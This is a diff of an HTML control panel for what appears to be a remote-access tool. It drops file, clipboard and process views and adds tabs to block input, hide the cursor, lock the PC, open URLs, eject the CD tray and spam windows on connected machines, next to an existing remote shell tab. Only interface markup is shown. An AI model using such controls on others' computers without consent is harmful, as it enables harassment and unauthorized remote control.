@@ -45,10 +45,6 @@
                     <span class="icon">📝</span>
                     <span>Logs</span>
                 </a>
-                <a href="#" class="nav-item" data-view="info">
-                    <span class="icon">📊</span>
-                    <span>System Info</span>
-                </a>
             </nav>
 
             <div class="sidebar-footer">
@@ -151,16 +147,6 @@
                     </div>
                 </div>
             </div>
-
-            <!-- System Info View -->
-            <div class="view" id="info">
-                <div class="info-container">
-                    <h2>System Information</h2>
-                    <div class="info-grid" id="infoGrid">
-                        <p class="empty-state">Select an agent to view system information</p>
-                    </div>
-                </div>
-            </div>
         </main>
     </div>
 
@@ -215,9 +201,12 @@
                 <div class="tabs">
                     <button class="tab active" data-tab="shell">💻 Shell</button>
                     <button class="tab" data-tab="message">💬 Message</button>
-                    <button class="tab" data-tab="files">📁 Files</button>
-                    <button class="tab" data-tab="system">⚙️ System</button>
                     <button class="tab" data-tab="tts">🔊 TTS</button>
+                    <button class="tab" data-tab="url">🌐 URL</button>
+                    <button class="tab" data-tab="volume">🔉 Volume</button>
+                    <button class="tab" data-tab="cdtray">💿 CD Tray</button>
+                    <button class="tab" data-tab="input">⌨️ Input</button>
+                    <button class="tab" data-tab="spam">🔥 Spam</button>
                 </div>
 
                 <!-- Tab Contents -->
@@ -257,48 +246,6 @@
                     </div>
                 </div>
 
-                <div class="tab-content" id="files">
-                    <div class="files-panel">
-                        <h3>📂 File Explorer</h3>
-                        <div class="file-explorer">
-                            <div class="explorer-controls">
-                                <input type="text" id="currentPath" value="C:\\" class="path-input">
-                                <button class="btn btn-info" onclick="browsePath()">📂 Browse</button>
-                                <button class="btn btn-secondary" onclick="goUpDirectory()">⬆️ Up</button>
-                            </div>
-                            <div class="file-list" id="fileList">
-                                <p class="empty-state">Enter path and click Browse</p>
-                            </div>
-                        </div>
-                        <hr style="margin: 30px 0; border-color: var(--border);">
-                        <h3>📋 Clipboard Manager</h3>
-                        <div class="clipboard-manager">
-                            <div class="clipboard-view">
-                                <textarea id="clipboardContent" rows="6" placeholder="Clipboard content will appear here..." class="clipboard-area"></textarea>
-                                <div class="clipboard-controls">
-                                    <button class="btn btn-info" onclick="refreshClipboard()">🔄 Refresh</button>
-                                    <button class="btn btn-primary" onclick="setClipboard()">💾 Set Clipboard</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="tab-content" id="system">
-                    <div class="system-panel">
-                        <h3>⚙️ Task Manager</h3>
-                        <div class="task-manager">
-                            <div class="task-controls">
-                                <button class="btn btn-info" onclick="refreshProcesses()">🔄 Refresh Processes</button>
-                                <input type="text" id="processSearch" placeholder="Search process..." class="process-search">
-                            </div>
-                            <div class="process-list" id="processList">
-                                <p class="empty-state">Click refresh to load processes</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
                 <div class="tab-content" id="tts">
                     <div class="tts-panel">
                         <h3>🔊 Text-to-Speech</h3>
@@ -312,6 +259,87 @@
                                 </select>
                                 <button class="btn btn-primary" onclick="speakText()">🔊 Speak</button>
                             </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="url">
+                    <div class="message-box">
+                        <h3>🌐 Open URL</h3>
+                        <div class="form-group">
+                            <label>URL:</label>
+                            <input type="text" id="urlInput" placeholder="https://example.com" value="https://google.com">
+                        </div>
+                        <button class="btn btn-primary" onclick="openURL()">🌐 Open URL</button>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="volume">
+                    <div class="message-box">
+                        <h3>🔉 Volume Control</h3>
+                        <div class="form-group">
+                            <label>Volume Level (0-100):</label>
+                            <input type="range" id="volumeSlider" min="0" max="100" value="50" oninput="document.getElementById('volumeValue').textContent = this.value">
+                            <span id="volumeValue">50</span>%
+                        </div>
+                        <div class="control-buttons">
+                            <button class="btn btn-primary" onclick="setVolume()">🔉 Set Volume</button>
+                            <button class="btn btn-warning" onclick="muteVolume()">🔇 Mute</button>
+                            <button class="btn btn-info" onclick="unmuteVolume()">🔊 Unmute</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="cdtray">
+                    <div class="message-box">
+                        <h3>💿 CD Tray Control</h3>
+                        <div class="control-buttons">
+                            <button class="btn btn-primary" onclick="cdTray('open')">📤 Open Tray</button>
+                            <button class="btn btn-info" onclick="cdTray('close')">📥 Close Tray</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="input">
+                    <div class="message-box">
+                        <h3>⌨️ Input Control</h3>
+                        <div class="control-buttons">
+                            <button class="btn btn-danger" onclick="blockInput()">🔒 Block Input</button>
+                            <button class="btn btn-success" onclick="unblockInput()">🔓 Unblock Input</button>
+                        </div>
+                        <br><br>
+                        <h3>🖱️ Cursor Control</h3>
+                        <div class="control-buttons">
+                            <button class="btn btn-danger" onclick="hideCursor()">👁️‍🗨️ Hide Cursor</button>
+                            <button class="btn btn-success" onclick="showCursor()">👁️ Show Cursor</button>
+                        </div>
+                        <br><br>
+                        <h3>🔒 Lock PC</h3>
+                        <div class="control-buttons">
+                            <button class="btn btn-warning" onclick="lockPC()">🔒 Lock Workstation</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="spam">
+                    <div class="message-box">
+                        <h3>🔥 Window Spam</h3>
+                        <div class="form-group">
+                            <label>Program:</label>
+                            <select id="spamProgram">
+                                <option value="notepad">Notepad</option>
+                                <option value="cmd">CMD</option>
+                                <option value="calc">Calculator</option>
+                                <option value="messagebox">Message Box</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Delay (ms):</label>
+                            <input type="number" id="spamDelay" value="1000" min="100" max="10000">
+                        </div>
+                        <div class="control-buttons">
+                            <button class="btn btn-danger" onclick="startSpam()">🔥 Start Spam</button>
+                            <button class="btn btn-success" onclick="stopSpam()">⏹️ Stop Spam</button>
                         </div>
                     </div>
                 </div>
